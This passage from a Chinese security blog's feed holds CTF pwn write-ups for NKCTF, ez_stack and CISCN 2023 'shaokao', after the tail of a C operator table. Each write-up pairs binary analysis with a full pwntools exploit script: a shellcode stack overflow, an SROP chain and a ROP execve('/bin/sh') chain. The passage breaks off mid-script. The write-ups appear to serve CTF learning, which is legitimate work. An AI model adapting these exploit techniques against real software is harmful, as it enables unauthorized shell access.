rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&#x3D;&#x3D;</td><td>等于</td><td>rexp &#x3D;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>!&#x3D;</td><td>不等于</td><td>rexp !&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&amp;</td><td>位与</td><td>rexp &amp; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>^</td><td>位异或</td><td>rexp ^ rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>|</td><td>位或</td><td>rexp | rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&amp;&amp;</td><td>逻辑与</td><td>rexp &amp;&amp; rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr><tr><td>||</td><td>逻辑或</td><td>rexp || rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr><tr><td>? :</td><td>条件操作符</td><td>rexp ? rexp : rexp</td><td>rexp</td><td>N&#x2F;A</td><td>是</td></tr><tr><td>&#x3D;</td><td>赋值</td><td>lexp &#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>+&#x3D;</td><td>以…加</td><td>lexp +&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>-&#x3D;</td><td>以…减</td><td>lexp -&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*&#x3D;</td><td>以…乘</td><td>lexp *&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&#x2F;&#x3D;</td><td>以…除</td><td>lexp &#x2F;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>%&#x3D;</td><td>以…取模</td><td>lexp %&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&lt;&lt;&#x3D;</td><td>以…左移</td><td>lexp &lt;&lt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&gt;&gt;&#x3D;</td><td>以…右移</td><td>lexp &gt;&gt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&amp;&#x3D;</td><td>以…与</td><td>lexp &amp;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>^&#x3D;</td><td>以…异或</td><td>lexp ^&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>|&#x3D;</td><td>以…或</td><td>lexp |&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>，</td><td>逗号</td><td>rexp，rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr></tbody></table><p>简单记就是:!&gt;算术运算符&gt;关系运算符符&gt;&amp;&amp;&gt;||&gt;赋值运算符</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部分PWN题目记录</title>
      <link href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwn题目记录"><a href="#Pwn题目记录" class="headerlink" title="Pwn题目记录"></a><strong>Pwn题目记录</strong></h3><h3 id="【NKCTF】"><a href="#【NKCTF】" class="headerlink" title="【NKCTF】"></a>【NKCTF】</h3><p>弱小可怜无助的唯一。<br>（1）checkesec 发现为64位 只有NX保护<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530231132244.png" alt="image-20230530231132244"></p><p>（2）进IDA分析 </p><p>  F5查看main函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234240598.png"></p><p>  查看偏移为0x74（buf[108]+8[ebp大小]） buf2大小随机  无后门函数 此时联想到使用pwntools生成可利用的shellcode   v6随机执行但未设置随机数种子【注释打漏了😜】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234339502.png" alt="image-20230530234339502"><br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;, 1337)</span></span><br><span class="line">buf = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">108</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">payload = buf + <span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">104</span>-<span class="built_in">len</span>(shellcode)) +shellcode</span><br><span class="line">log.success(<span class="string">&quot;shellcode_len : &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>选择用\x90（nop）进行填充使得攻击代码更具稳定性<br>104减去shellcode长度的b’\x90’字节，这个部分作用是将shellcode挪到最后（shellcode可能在中间生成），如果没有nopsled的填充，后面的数据会覆盖前面的shellcode，从而导致攻击失败。也就是说，这部分的填充是为了让Shellcode不会被后面的数据覆盖。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531002410442.png" alt="image-20230531002410442"></p><p>统统通</p><h3 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a><strong>ez_stack</strong></h3><p>(1)checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150721336.png" alt="image-20230531150721336"></p><p>发现NX打开 准备进IDA找溢出</p><p>（2）进IDA<br>  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150942976.png" alt="image-20230531150942976"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531151017632.png" alt="image-20230531151017632"></p><p>​       发现溢出部分 无”&#x2F;bin&#x2F;sh” 需要我们构造rop链自行写入<br>​       常规思路就是第一次rop往<a href="https://so.csdn.net/so/search?q=bss&spm=1001.2101.3001.7020">bss</a>上写&#x2F;bin&#x2F;sh，然后第二次调用execve<br>​       但程序本身没有本地直接调用函数-&gt;通过syscall来得到shell<br>​       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531170223533.png" alt="image-20230531170223533"></p><p> 查看发现为SROP  在.data段找到可写入&#x2F;bin&#x2F;sh的地址</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531160459228.png" alt="image-20230531160459228"> </p><p>执行完 read 的系统调用，此时 rax &#x3D;&#x3D; 0  利用SROP 【只用于可写方法内】<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531171529997.png" alt="image-20230531171529997"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node2.yuzhian.com.cn&#x27;,35543)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x4011ee</span></span><br><span class="line">mov_rax_15 = <span class="number">0x401146</span></span><br><span class="line">bin_sh = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#call execv(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = bin_sh</span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x4011C8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rax_15)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="built_in">str</span>(sigframe)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;F!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SROP小赠品（<a href="https://www.cnblogs.com/bpcat/p/16879300.html">https://www.cnblogs.com/bpcat/p/16879300.html</a>)</p><h3 id="【2023CISCN】"><a href="#【2023CISCN】" class="headerlink" title="【2023CISCN】"></a>【2023CISCN】</h3><h4 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a><strong>shaokao</strong></h4><p>（1）虚拟机checksec一下</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/0.png" alt="0"></p><p>（2）运行一下程序玩玩</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/1.png" alt="1"></p><p>发现没碰到特别之处<br>（3）转战IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/2.png" alt="2"></p><p>查看mian函数发现隐藏目录5 跟踪看看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/3.png" alt="3"></p><p>发现strcpy 猜测v1进行了溢出</p><p>再往下翻翻<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/4.png" alt="4"></p><p>syscall  以及sys_exit 明显的系统调用号</p><p>到data段查找可写入口<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/5.png" alt="5"></p><p>搜索sys 发现-result 猜测负数（-10000）打开目录5<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527200932728.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/8.png" alt="8">（4）利用ROPgadget 构造所需execve系统调用exp<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/61.png" alt="61"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/6.png" alt="6"></p><p>（5）构造对应exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;39.106.71.184&#x27;,23931)</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;？\n&quot;</span>,<span class="string">b&quot;-10000&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret _1</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret _59</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>,p)</span><br><span class="line">r.interactive(）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527201915278.png" alt="image-20230527201915278"></p><p>优化后的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">r=process(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;39.106.71.184&#x27;,23931)</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;？\n&quot;</span>,<span class="string">b&quot;-10000&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">pop_rsi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) </span><br><span class="line">pop_rax_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>)</span><br><span class="line">mov_rax_ptr_rsi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>)</span><br><span class="line">xor_rax_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>)</span><br><span class="line">pop_rdi_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>)</span><br><span class="line">pop_rdx_rbx_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>)</span><br><span class="line"></span><br><span class="line">p = padding</span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>)   <span class="comment"># @ .data</span></span><br><span class="line">p += pop_rax_ret + <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += mov_rax_ptr_rsi_ret</span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>)   <span class="comment"># @ .data + 8</span></span><br><span class="line">p += xor_rax_ret</span><br><span class="line">p += mov_rax_ptr_rsi_ret</span><br><span class="line">p += pop_rdi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>)   <span class="comment"># @ .data</span></span><br><span class="line">p += pop_rsi_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>)   <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pop_rdx_rbx_ret + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>) + pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">p += xor_rax_ret</span><br><span class="line">add_rip_ret = pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; 